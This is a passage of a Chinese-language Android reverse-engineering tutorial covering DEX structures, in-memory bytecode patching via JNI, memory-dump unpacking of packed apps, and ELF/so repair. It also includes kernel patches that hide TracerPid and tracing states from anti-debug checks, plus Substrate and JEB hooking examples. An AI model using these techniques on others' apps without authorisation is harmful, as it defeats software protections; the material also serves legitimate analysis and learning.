string_ids、type_ids、proto_ids、field_ids、method_ids 几个数据结构。数组结构如下： 12345678910111213141516171819202122232425262728293031323334353637383940/* * Direct-mapped \"string_id_item\". */struct DexStringId &#123; u4 stringDataOff; /* file offset to string_data_item */&#125;;/* * Direct-mapped \"type_id_item\". */struct DexTypeId &#123; u4 descriptorIdx; /* index into stringIds list for type descriptor */&#125;;/* * Direct-mapped \"field_id_item\". */struct DexFieldId &#123; u2 classIdx; /* index into typeIds list for defining class */ u2 typeIdx; /* index into typeIds for field type */ u4 nameIdx; /* index into stringIds for field name */&#125;;/* * Direct-mapped \"method_id_item\". */struct DexMethodId &#123; u2 classIdx; /* index into typeIds list for defining class */ u2 protoIdx; /* index into protoIds for method prototype */ u4 nameIdx; /* index into stringIds for method name */&#125;;/* * Direct-mapped \"proto_id_item\". */struct DexProtoId &#123; u4 shortyIdx; /* index into stringIds for shorty descriptor */ u4 returnTypeIdx; /* index into typeIds list for return type */ u4 parametersOff; /* file offset to type_list for parameter types */&#125;; 数据区数据段包括 class_defs、data、link_data，数据结构如下： 1234567891011121314151617181920212223242526272829303132333435363738/* * Direct-mapped \"map_item\". */struct DexMapItem &#123; u2 type; /* type code (see kDexType* above) */ u2 unused; u4 size; /* count of items of the indicated type */ u4 offset; /* file offset to the start of data */&#125;;/* * Direct-mapped \"map_list\". */struct DexMapList &#123; u4 size; /* #of entries in list */ DexMapItem list[1]; /* entries */&#125;;/* * Direct-mapped \"class_def_item\". */struct DexClassDef &#123; u4 classIdx; /* index into typeIds for this class */ u4 accessFlags; u4 superclassIdx; /* index into typeIds for superclass */ u4 interfacesOff; /* file offset to DexTypeList */ u4 sourceFileIdx; /* index into stringIds for source file name */ u4 annotationsOff; /* file offset to annotations_directory_item */ u4 classDataOff; /* file offset to class_data_item */ u4 staticValuesOff; /* file offset to DexEncodedArray */&#125;;/* * Link table. Currently undefined. */struct DexLink &#123; u1 bleargh;&#125;; 动态代码自修改（加壳原理）DexClassDef -&gt; DexClassData -&gt; DexMethod -&gt; DexCode -&gt; insns 1234567891011121314151617181920/* * Direct-mapped \"code_item\". * * The \"catches\" table is used when throwing an exception, * \"debugInfo\" is used when displaying an exception stack trace or * debugging. An offset of zero indicates that there are no entries. */struct DexCode &#123; u2 registersSize; // 使用的寄存器个数 u2 insSize; // 参数个数 u2 outsSize; // 调用其他方法时使用的寄存器个数 u2 triesSize; // Try/Catch的个数 u4 debugInfoOff; // 指令调试信息的偏移 /* file offset to debug info stream */ u4 insnsSize; // 指令集个数，以2字节为单位 /* size of the insns array, in u2 units */ u2 insns[1]; // 指令集 /* followed by optional u2 padding */ /* followed by try_item[triesSize] */ /* followed by uleb128 handlersSize */ /* followed by catch_handler_item[handlersSize] */&#125;; 其中，insns 的值是用于存放程序实现代码的地方。程序执行的时候会把整个 dex 文件加载到内存之中，然后动态地解析执行 insns 中的内容。只要修改了里面的数据，就相当于修改了程序执行流程。 修改 insns直接在内存中修改 定位到 dex 文件 计算函数的 DexCode 位置 重写 DexCode 的 insns 数据 JNI BridgeJNI 提供了让我们在 C++代码层中直接操作 Dalvik（Java）数据的接口，可以直接在 JNI 中操作相关数据来修改 Android 中的代码。 Object 结构体Android 运行时，解析 dex 文件，并生成相关的结构体：DvmDex。其中存储了各种字符串、类、方法等信息。加载的时候，调用 dvmDexFileOpenPartial 对 dex 文件进行解析，并转化为可执行的结构体，这也是这个函数可以作为脱壳用的函数的原因之一。（以前的爱加密可以直接通过 Hook 这个函数进行脱壳）。 其中 Method 结构体是根据 DexMethod 生成的执行方法类。Dalvik 执行代码时，都是从 Method 中取出代码来执行的。因此可以直接通过操作 Method 结构体来修改执行的代码。 Example首先新建一个 JNI 项目，并新建两个函数 ret1() 和 ret2() 函数，以及一个 Native 函数 changeMethod()： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.assassinq.editdexfile;import android.os.Bundle;import com.google.android.material.floatingactionbutton.FloatingActionButton;import androidx.appcompat.app.AppCompatActivity;import androidx.appcompat.widget.Toolbar;import android.util.Log;import android.view.View;import android.view.Menu;import android.view.MenuItem;import java.lang.reflect.Method;public class MainActivity extends AppCompatActivity &#123; static &#123; System.loadLibrary(\"hello\"); &#125; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Toolbar toolbar = findViewById(R.id.toolbar); setSupportActionBar(toolbar); FloatingActionButton fab = findViewById(R.id.fab); fab.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; try &#123; Method m = MainActivity.class.getMethod(\"ret1\"); Log.d(\"DEBUG\", \"Return Value = \" + ret1()); changeMethod(m); Log.d(\"DEBUG\", \"Return Value = \" + ret1()); &#125; catch (Exception e) &#123;// e.printStackTrace(); Log.d(\"EXCEPTION\", Log.getStackTraceString(e)); &#125; &#125; &#125;); &#125; @Override public boolean onCreateOptionsMenu(Menu menu) &#123; // Inflate the menu; this adds items to the action bar if it is present. getMenuInflater().inflate(R.menu.menu_main, menu); return true; &#125; @Override public boolean onOptionsItemSelected(MenuItem item) &#123; // Handle action bar item clicks here. The action bar will // automatically handle clicks on the Home/Up button, so long // as you specify a parent activity in AndroidManifest.xml. int id = item.getItemId(); //noinspection SimplifiableIfStatement if (id == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(item); &#125; public int ret1() &#123; return 1; &#125; public int ret2() &#123; return 2; &#125; // public native void changeMethod(Method r1);&#125; 先编译生成一个不包含 JNI 的 apk，解压后取出其中的 classes.dex，然后在 010 Editor 中用 DEX Template 解析，找到 DexCode 中的 insns，并记录下 ret1() 和 ret2() 的字节码： 然后完善 JNI 函数，并且需要导入 Android 源码中 Dalvik 文件夹下相关的头文件。JNI 实现如下，将 ret1() 所指向的字节码修改为 ret2() 的字节码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;jni.h&gt;#include &lt;string.h&gt;#include &lt;android/log.h&gt;#include \"Object.h\"#include \"Common.h\"#ifdef LOG_TAG#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endifconst char insns[] = &#123;0x12, 0x20, 0x0F, 0x00&#125;;void changeMethod(JNIEnv *env, jobject obj, jobject method) &#123; /* * 12 10 0F 00 -&gt; ret 1 * 12 20 0F 00 -&gt; ret 2 */ Method *pMethod = (Method *) env-&gt;FromReflectedMethod(method); pMethod-&gt;insns = (const u2*) insns;&#125;static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) &#123; jclass clazz; clazz = env-&gt;FindClass(className); if (clazz == NULL) &#123; return JNI_FALSE; &#125; if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) &#123; return JNI_FALSE; &#125; return JNI_TRUE;&#125;static const char *gClassName = \"com/assassinq/editdexfile/MainActivity\";static JNINativeMethod gMethods[] = &#123; &#123;\"changeMethod\", \"(Ljava/lang/reflect/Method;)V\", (void *) changeMethod&#125;,&#125;;JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) &#123; JNIEnv *env = NULL; if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123; LOGE(\"This jni version is not supported\"); return -1; &#125; if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) == JNI_FALSE) &#123; LOGE(\"Unable to register native methods\"); return -1; &#125; LOGE(\"Methods loaded successfully\"); return JNI_VERSION_1_6;&#125; 运行程序并点击触发事件，查看日志发现修改生效： 1202-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 102-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 2 IDA 中动态修改 Ctrl+s 打开 map 数据 查找内存加载的额 classes.dex 的位置 直接计算偏移，修改相应的位置 内存修改的另一种方法修改方法定位：dexClassDef 遍历以获取 MethodId，对比 MethodName 与 proto 以获取目标 Method，然后对相应的 DexCode 进行修改。由于 Dex 加载到内存中是只有只读权限，故需要先修改内存页的权限才能正常地修改 DexCode 数据。 遍历 Map： 12345678910111213141516171819202122232425void *get_module_base(pid_t pid, const char *module_name) &#123; FILE *fp; long addr = 0; char *pch; char filename[32]; char line[1024]; if (pid &lt; 0) &#123; snprintf(filename, sizeof(filename), \"/proc/self/maps\"); &#125; else &#123; snprintf(filename, sizeof(filename), \"/proc/%d/maps\", pid); &#125; fp = fopen(filename, \"r\"); if (fp != NULL) &#123; while (fgets(line, sizeof(line), fp)) &#123; LOGD(\"%s\", line); if (strstr(line, module_name)) &#123; pch = strtok(line, \"-\"); addr = strtoul(pch, NULL, 16); break; &#125; &#125; fclose(fp); &#125; return (void *) addr;&#125; 重置 Map 属性： 12345678#include &lt;asm-generic/mman-common.h&gt;#include &lt;sys/mman.h&gt;#include &lt;limits.h&gt;if (mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) &#123; *(u4 *)(pCode-&gt;insns) = 0x000f2012; mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);&#125; Example接下来编写 changeMethod2 函数，利用 dalvik 中的一些函数来逐步定位到指定函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152void changeMethod2(JNIEnv *env, jobject obj) &#123; u1 *pDex = (u1 *) get_module_base(-1, \"/data/dalvik-cache/data@app@com.assassinq.editdexfile\"); if (pDex != NULL) &#123; LOGD(\"Get Module\"); pDex += sizeof(DexOptHeader); DexFile *pDexFile = dexFileParse(pDex, sizeof(DexHeader), kDexParseContinueOnError); if (pDexFile == NULL) &#123; LOGE(\"Unable to parse DexFile\"); return; &#125; const DexClassDef *pClassDef; for (int i = 0; i &lt; pDexFile-&gt;pHeader-&gt;classDefsSize; ++i) &#123; const DexClassDef *pDef = dexGetClassDef(pDexFile, i); if (!strcmp(dexStringByTypeIdx(pDexFile, pDef-&gt;classIdx), \"Lcom/assassinq/editdexfile/MainActivity;\")) &#123; pClassDef = pDef; break; &#125; &#125; if (pClassDef != NULL) &#123; LOGD(\"Class Found\"); const u1 *pData = dexGetClassData(pDexFile, pClassDef); if (pData) &#123; DexClassData *pClassData = dexReadAndVerifyClassData(&amp;pData, NULL); for (int i = 0; i &lt; pClassData-&gt;header.virtualMethodsSize; ++i) &#123; DexMethod *pMethod = &amp;pClassData-&gt;virtualMethods[i]; const DexMethodId *pMethodId = dexGetMethodId(pDexFile, pMethod-&gt;methodIdx); if (!strcmp(dexStringById(pDexFile, pMethodId-&gt;nameIdx), \"ret1\")) &#123; const DexCode *pCode = dexGetCode(pDexFile, pMethod); LOGD(\"Method found and try to patch\"); if (mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE) == 0) &#123; *(u4 *) (pCode-&gt;insns) = 0x000F2012; mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE, PROT_READ); &#125; &#125; &#125; free(pClassData); &#125; &#125; dexFileFree(pDexFile); &#125;&#125;static JNINativeMethod gMethods[] = &#123; ... &#123;\"changeMethod2\", \"()V\", (void *) changeMethod2&#125;,&#125;;... 在 app 下的 build.gradle 中修改以强制转换指针： 123456789101112android &#123; ... defaultConfig &#123; ... externalNativeBuild &#123; cmake &#123; cppFlags &quot;-fpermissive&quot; &#125; &#125; &#125; ...&#125; TODO: DVM 脱壳目前存在对 apk 中的 classes.dex 进行加密的技术，称为加壳。通过对 dex 文件的加壳，可以达到减少体积，隐藏真实代码的效果。Android 的壳与 PE 文件一样，在程序运行时，先到达壳的入口点，运行解壳代码，然后再到达程序入口点并运行代码。如果要脱壳，就需要在程序解码完毕并到达程序真实入口点中间某个位置，把原始的 dex 代码给 dump 下来，还原到 apk 文件中。 查壳壳入口： 1&lt;application android:name=\"com.ali.mobisecenhance.SubApplication\" /&gt; 程序入口： 1&lt;activity android:name=\"com.ali.encryption.MainActivity\" /&gt; assets 分析assets 中一般存储着加密过的 dex，以及解密用的 so 等信息，因此先分析 assets 可以有效获取程序解壳思路。 ProxyApplication 分析壳代码分析壳代码中 Java 层转 Native 层： 12protected native void attachBaseContext(Context arg1) &#123;&#125; // 还原代码public native void onCreate() &#123;&#125; // 执行原始代码 so 文件分析带压缩的，一般用 libz 中的 uncompress 函数进行解码，可以用该函数进行快速定位。 IDA 中 dump 数据在 Native 层中解密 dex 数据并还原后，替换为原始 Application。IDC Dump 脚本： 12345678910static main(void) &#123; auto fp, begin, end, len, b; fp = fopen(\"dump.data\", \"wb\"); begin = 0x544D2008; // 解密后数据在内存中的位置 len = 0x019CF4; // 文件大小 end = begin + len; for (b = begin; b &lt; end; b++) &#123; fputc(Byte(b), fp); &#125;&#125; Dex 加载流程vm-&gt;native-&gt;dalvik_systm_DexFile-&gt;openDexFile，读取内存中的 Dex 文件数据，并加载 Dalvik_dalvik_system_DexFile_openDexFile_bytearray。 1234// 转换存储的dex格式为可执行的dex格式dvmRawDexFileOpenArray(pBytes, length, &amp;pRawDexFile);// 添加到gDvm中addToDexFileTable(pDexOrJar); 壳实现加载流程： 内存中解密 dex 函数 将 dex 存储结构转换为可执行结构 添加到 gDvm 中（有些壳是自己实现了这个功能，有些是调用了系统的函数） 抹去 dex 存储结构中的有效数据 内存 dex 定位gDvm.userDexFiles 是存放 dex cookie（dexOfJar 结构）的地方，因此可以通过遍历该数据结构来获得每个 dex 文件的起始地址。 Dex 重构：通过分析内存中的 dex 存储结构，完成对整个 dex 文件的 dump。 Dex 转 Odex：优化 vm\\analysis\\Optimize.cpp-&gt;dvmOptimizeClass Dex 校验：vm\\analysis\\DexVerify.cpp-&gt;dvmVerifyClass 取消非必要优化与校验：\\system\\build.prop =&gt; Dalvik.vm.dexopt-flag=v=n,o=n ELF 文件简介（ARM 架构下的 ELF）文件结构ELF 在加载前和加载后的文件格式是完全不同的，给加密提供了方便。 链接执行时，Section Header 中的表将会被映射到 Program Header 中，里面的 ELF Header、Program Header 和 Section header 非常重要，Linker 会根据这三个头信息进行 so 文件加载。 PS：如何从内存中 dump 下 so 文件？开启 IDA 动态调试，在 Module 窗口中找到对应的 so 文件，根据 so 文件的起始地址和文件大小，使用 IDC 脚本 dump 下来。 ELF Header存储 so 文件最为基本的信息，如 so 运行的 CPU 平台、Program Header 数量、Section Header 数量等，重要性等同于 Dex Header。 123456789101112131415161718192021$ readelf -h libxtian.soELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: ARM Version: 0x1 Entry point address: 0x0 Start of program headers: 52 (bytes into file) Start of section headers: 117240 (bytes into file) Flags: 0x5000200, Version5 EABI, soft-float ABI Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 8 Size of section headers: 40 (bytes) Number of section headers: 25 Section header string table index: 24 Section Header存储 so 的链接用信息，主要是用于给外部程序详细地提供本 so 的信息，比如第几行对应哪个函数、什么名字、对应着源码的什么位置等等。IDA 就是通过读取该头信息进行 so 分析的。 12345678910111213141516171819202122232425262728293031323334$ readelf -S libxtian.soThere are 25 section headers, starting at offset 0x1c9f8:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .note.gnu.build-i NOTE 00000134 000134 000024 00 A 0 0 4 [ 2] .dynsym DYNSYM 00000158 000158 000570 10 A 3 1 4 [ 3] .dynstr STRTAB 000006c8 0006c8 00034e 00 A 0 0 1 [ 4] .hash HASH 00000a18 000a18 000270 04 A 2 0 4 [ 5] .gnu.version VERSYM 00000c88 000c88 0000ae 02 A 2 0 2 [ 6] .gnu.version_d VERDEF 00000d38 000d38 00001c 00 A 3 1 4 [ 7] .gnu.version_r VERNEED 00000d54 000d54 000020 00 A 3 1 4 [ 8] .rel.dyn REL 00000d74 000d74 0050f8 08 A 2 0 4 [ 9] .rel.plt REL 00005e6c 005e6c 0000a0 08 AI 2 10 4 [10] .plt PROGBITS 00005f0c 005f0c 000104 00 AX 0 0 4 [11] .text PROGBITS 00006010 006010 013684 00 AX 0 0 4 [12] .ARM.extab PROGBITS 00019694 019694 0001a4 00 A 0 0 4 [13] .ARM.exidx ARM_EXIDX 00019838 019838 000250 08 AL 11 0 4 [14] .rodata PROGBITS 00019a90 019a90 0002d0 00 A 0 0 16 [15] .fini_array FINI_ARRAY 0001ad64 019d64 000008 00 WA 0 0 4 [16] .init_array INIT_ARRAY 0001ad6c 019d6c 000004 00 WA 0 0 1 [17] .dynamic DYNAMIC 0001ad70 019d70 000120 08 WA 3 0 4 [18] .got PROGBITS 0001ae90 019e90 000170 00 WA 0 0 4 [19] .data PROGBITS 0001b000 01a000 002870 00 WA 0 0 16 [20] .bss NOBITS 0001d870 01c870 0001d8 00 WA 0 0 4 [21] .comment PROGBITS 00000000 01c870 00003d 01 MS 0 0 1 [22] .note.gnu.gold-ve NOTE 00000000 01c8b0 00001c 00 0 0 4 [23] .ARM.attributes ARM_ATTRIBUTES 00000000 01c8cc 000036 00 0 0 1 [24] .shstrtab STRTAB 00000000 01c902 0000f6 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) Program Header存储 so 文件运行时需要的信息。该信息会直接被 Linker 所使用，运用于 so 加载。因此这个 Header 的数据是肯定可信的 123456789101112131415161718192021222324252627$ readelf -l libxtian.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x00000034 0x00000034 0x00100 0x00100 R 0x4 LOAD 0x000000 0x00000000 0x00000000 0x19d60 0x19d60 R E 0x1000 LOAD 0x019d64 0x0001ad64 0x0001ad64 0x02b0c 0x02ce4 RW 0x1000 DYNAMIC 0x019d70 0x0001ad70 0x0001ad70 0x00120 0x00120 RW 0x4 NOTE 0x000134 0x00000134 0x00000134 0x00024 0x00024 R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0 EXIDX 0x019838 0x00019838 0x00019838 0x00250 0x00250 R 0x4 GNU_RELRO 0x019d64 0x0001ad64 0x0001ad64 0x0029c 0x0029c RW 0x4 Section to Segment mapping: Segment Sections... 00 01 .note.gnu.build-id .dynsym .dynstr .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.extab .ARM.exidx .rodata 02 .fini_array .init_array .dynamic .got .data .bss 03 .dynamic 04 .note.gnu.build-id 05 06 .ARM.exidx 07 .fini_array .init_array .dynamic .got 加载 so 的流程Android 上的 ELF 文件是通过 Linker（位于 Bionic/Linker）加载到内存中并进行执行的。所以通过研究 Linker 可以清楚地知道 Android 系统到底使用了到了 so 的哪些数据。Linker 启动时会先对自身的函数表数据等进行重定位，然后再对其他 so 文件进行定位。 Linkere 加载中只会用到 Program Header（甚至直接删除 Section Header 也是可以的）。Program Header 解析： 12345link.cpp -&gt; soinfo *do_dlopen(const char *name, int flags) // so加载find_library(name);si-&gt;CallConstructors();CallFunction(\"DT_INIT\", init_func); // so脱壳点CallArray(\"DT_INIT_ARRAY\", init_array, init_array_count, false); // dex脱壳点 加载 so 的时候，有两种加载方式，一个是直接 load，还有一个是 loadLibrary。无论是哪种方式，都会先获取 ClassLoader，然后再调用相应的方法。当传进来的 loader 不为空，则会调用 findLibrary 方法，然后执行 doLoad 方法，如果 loader 为空，则会执行另一个流程，但是后面也会执行 doLoad 方法。 ELF 文件变形与保护（阻碍分析） Section 段处理：鉴于 Section Header 没有被 Linker 用于加载，所以可以对 Section 段写入无用数据，可以阻碍静态分析软件的分析。 Program 段处理：Program 段中可以对 DYNAMIC 区段进行混淆，添加重复的数据以及无效的数据。 so 文件加壳修复12345678Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align EXIDX 0x02867c 0x0002867c 0x0002867c 0x00568 0x00568 R 0x4 LOAD 0x000000 0x00000000 0x00000000 0x13294 0x13294 R E 0x8000 LOAD 0x018c10 0x00030c10 0x00030c10 0x0052c 0x01548 RW 0x8000 DYNAMIC 0x018c74 0x00030c74 0x00030c74 0x00108 0x00108 RW 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4 GNU_RELRO 0x018c10 0x00030c10 0x00030c10 0x003f0 0x003f0 R 0x1 加过壳的标志：FileSiz!=MemSiz，明显存在加载后在内存进行解码的可能。函数地址也在文件之外。 修复：dump 内存，数据对齐重定位。 Android 源码定制添加反反调试基址反调试一般会检测 proc 下是否有 status/stat 文件。首先修改 kernel 源码中的 fs/proc/base.c。修改 proc_pid_wchan 函数的返回值： 12345678910111213141516171819static int proc_pid_wchan(struct task_struct *task, char *buffer)&#123; unsigned long wchan; char symname[KSYM_NAME_LEN]; wchan = get_wchan(task); if (lookup_symbol_name(wchan, symname) &lt; 0) if (!ptrace_may_access(task, PTRACE_MODE_READ)) return 0; else return sprintf(buffer, \"%lu\", wchan); else &#123; if (strstr(symname, \"trace\")) &#123; // 检测进程中是否有trace这个字符串 return sprintf(buffer, \"%s\", \"sys_epoll_wait\"); // sys_epoll_wait用来获取文件状态已经就绪的事件 &#125; return sprintf(buffer, \"%s\", symname); &#125;&#125; 然后是 fs/proc/array.c 文件，分别修改 tast_state 函数和 task_state_array 变量： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465static inline void task_state(struct seq_file *m, struct pid_namespace *ns, struct pid *pid, struct task_struct *p)&#123; struct group_info *group_info; int g; struct fdtable *fdt = NULL; const struct cred *cred; pid_t ppid, tpid; rcu_read_lock(); ppid = pid_alive(p) ? task_tgid_nr_ns(rcu_dereference(p-&gt;real_parent), ns) : 0; tpid = 0; if (pid_alive(p)) &#123; struct task_struct *tracer = ptrace_parent(p); if (tracer) tpid = task_pid_nr_ns(tracer, ns); &#125; cred = get_task_cred(p); seq_printf(m, \"State:\\t%s\\n\" \"Tgid:\\t%d\\n\" \"Pid:\\t%d\\n\" \"PPid:\\t%d\\n\" \"TracerPid:\\t%d\\n\" \"Uid:\\t%d\\t%d\\t%d\\t%d\\n\" \"Gid:\\t%d\\t%d\\t%d\\t%d\\n\", get_task_state(p), task_tgid_nr_ns(p, ns), pid_nr_ns(pid, ns), ppid, 0, // 把tpid修改为0 cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid, cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid); task_lock(p); if (p-&gt;files) fdt = files_fdtable(p-&gt;files); seq_printf(m, \"FDSize:\\t%d\\n\" \"Groups:\\t\", fdt ? fdt-&gt;max_fds : 0); rcu_read_unlock(); group_info = cred-&gt;group_info; task_unlock(p); for (g = 0; g &lt; min(group_info-&gt;ngroups, NGROUPS_SMALL); g++) seq_printf(m, \"%d \", GROUP_AT(group_info, g)); put_cred(cred); seq_putc(m, '\\n');&#125;static const char * const task_state_array[] = &#123; \"R (running)\", /* 0 */ \"S (sleeping)\", /* 1 */ \"D (disk sleep)\", /* 2 */ \"S (sleeping)\", // \"T (stopped)\", /* 4 */ \"S (sleeping)\", // \"t (tracing stop)\", /* 8 */ \"Z (zombie)\", /* 16 */ \"X (dead)\", /* 32 */ \"x (dead)\", /* 64 */ \"K (wakekill)\", /* 128 */ \"W (waking)\", /* 256 */&#125;; 然后可以根据这篇文章把 boot.img 重新打包并刷入手机。 Refereenceshttps://www.bilibili.com/video/av45424886https://www.jianshu.com/p/f7f0a712ddfehttps://source.android.com/devices/tech/dalvik/dex-format.htmlhttps://www.jianshu.com/p/f7f0a712ddfehttp://gnaixx.cc/2016/11/26/20161126dex-file/https://www.cnblogs.com/stars-one/p/8890162.htmlhttp://shxi.me/posts/7b82cd68.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"android","slug":"android","permalink":"qianfei11.coding.me/tags/android/"}]},{"title":"Android逆向入门（三）","slug":"Android逆向入门（三）","date":"2020-02-12T06:06:59.000Z","updated":"2020-02-19T09:06:39.439Z","comments":true,"path":"2020/02/12/Android逆向入门（三）/","link":"","permalink":"qianfei11.coding.me/2020/02/12/Android逆向入门（三）/","excerpt":"记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。","text":"记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。 JEB 插件扩展插件帮助文件1$JEB/doc/apidoc 插件编写语言：Java/Python 123456789import jeb.api.IScript;public class decJebString implemants IScript &#123; private JebInstance jeb = null; @Override public void run(JebInstance jebInstance) &#123; jeb = jebInstance; jeb.print(\"Hello World!!!\"); &#125;&#125; 强制反编译结果，相当于 Ctrl+F5： 12345678910111213141516171819202122232425262728import jeb.api.IScript;public class decJebString implemants IScript &#123; private static String targetSignature = \"Lcom/pnfsoftware/jebglobal/decStr;-&gt;decodeString([BII)Ljava/lang/String;\"; private JebInstance jeb = null; @Override public void run(JebInstance jebInstance) &#123; jeb = jebInstance; Dex dex = jeb.getDex(); List&lt;String&gt; classSignatures = dex.getClassSignatures(true); int methodCount = dex.getMethodCount(); String methodSig; for(int i = 0; i &lt; methodCount; i++) &#123; DexMethod dexMethod = dex.getMethod(i); int idx = dexMethod.getIndex(); methodSig = dexMethod.getSignature(true); if(methodSig.equals(targetSignature)) &#123; List&lt;Integer&gt; methodReferences = dex.getMethodReferences(idx); // 获取交叉引用 for(Integer refIdx : methodReferences) &#123; DexMethod refDexMethod = dex.getMethod(refIdx); jeb.decompileMethod(refDexMethod.getSignature(true)); ... &#125; &#125; &#125; ... &#125; ...&#125; Android 快速定位关键代码 字符串、特征字 关键 API 监控 Hook 解密函数 Monitor 插 Log 信息 invoke-static {v0}, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V 动态调试 快速 Hook 代码对函数进行挂钩，可以影响整个函数的执行。挂钩后，注入的代码可以接管整个函数，修改函数的参数，返回值，甚至整个函数的行为等。 Cydia Substrate只要知道类名就可以 Hook，而且属于系统全局属性，软件基本上不能检测到。 Hook Java 新建空项目 导入 lib 文件 substrate-api.jar 修改 AndroidManifest.xml 文件 编写入口类 安装激活插件，重启后可以看到插件效果 Example修改 AndroidManifest.xml 文件： 123456789&lt;manifest&gt; &lt;application&gt; ... &lt;meta-data android:name=\"com.saurik.substrate.main\" android:value=\"com.assassinq.cydiajavahook.CydiaMain\"/&gt; ... &lt;/application&gt; &lt;uses-permission android:name=\"cydia.permission.SUBSTRATE\"/&gt; &lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\"&gt;&lt;/uses-permission&gt;&lt;/manifest&gt; 编写入口类 12345678910111213141516171819202122232425262728293031package com.assassinq.cydiajavahook;import com.saurik.substrate.MS;import java.lang.reflect.Method;public class CydiaMain &#123; static void initialize() &#123; MS.hookClassLoad(\"android.content.res.Resources\", new MS.ClassLoadHook() &#123; @Override public void classLoaded(Class&lt;?&gt; resources) &#123; Method getColor; try &#123; getColor = resources.getDeclaredMethod(\"getColor\", Integer.TYPE); &#125; catch (Exception e) &#123; getColor = null; &#125; if (getColor != null) &#123; final MS.MethodPointer old = new MS.MethodPointer(); MS.hookMethod(resources, getColor, new MS.MethodHook() &#123; @Override public Object invoked(Object res, Object... args) throws Throwable &#123; int color = (Integer) old.invoke(res, args); return color &amp; ~0xFFFFFF | 0x00AAAA; &#125; &#125;, old); &#125; &#125; &#125;); &#125;&#125; 编写完成后，将程序安装到手机上，会弹出 Substrate extentions updated： 点击进入 Cydia Substrate，点击 Restart System (Soft) 来重启系统： 重启后发现系统某些部分的颜色已经被我们 Hook 成了其他颜色： 在设置中打开更加明显： Java 反射Java 可以通过反射方法去获取类以及它的成员。反射相当于提供一些函数，让我们在不知道原始累的定义的情况下，去修改类中相关的成员的属性、值等。 所有类都是继承自 Object 类的，所以都可以使用 Object 的方法。也可以强制转换为 Object。所有，遇到无法表示出来的对象时，直接用 Object 即可。 获取对象的类： 12Object obj = \"123\";Class clazz = obj.getClass(); 获取类中的方法（使用对应的不是以 s 为后缀的函数可以获取特定的函数或 field）： 1234Method[] mPubMethods = clazz.getMethods(); // 获取公有可直接调用的方法Method[] mDeclareMethods = clazz.getDeclareMethods(); // 获取类中声明的所有方法Field[] mPubFields = clazz.getFields(); // 获取public的fieldField[] mDeclareFields = clazz.getDeclaredFields(); // 获取声明的所有field 方法调用： 1method.invoke(obj, arg) 域操作： 12field.set(obj, \"1\");field.get(obj); 访问权限设置（域与方法都一样，控制是否可以直接访问，其实就是相当于 public 属性）： 12field.isAccessible();field.setAccessible(true); 其余的函数，可以获取函数的名称，还有其他种种信息： 123field.getName();field.toString();Class.forName(\"android.view.Menu\"); // 寻找类，必须是一个classloader下的才能使用 XposedXposed 是在程序启动的时候同时加载的，因此他的 Hook 是区分进程的。对于程序的类和参数可以通过名字来进行 Hook。Xposed 的 Hook 分为函数执行前和执行后两个位置，可以分别进行参数修改和结果修改。如果不想进行调用的话，可以在执行前使用 setResult(NULL) 函数。比起 Cydia 使用范围更加广泛，各种插件都是基于 Xposed 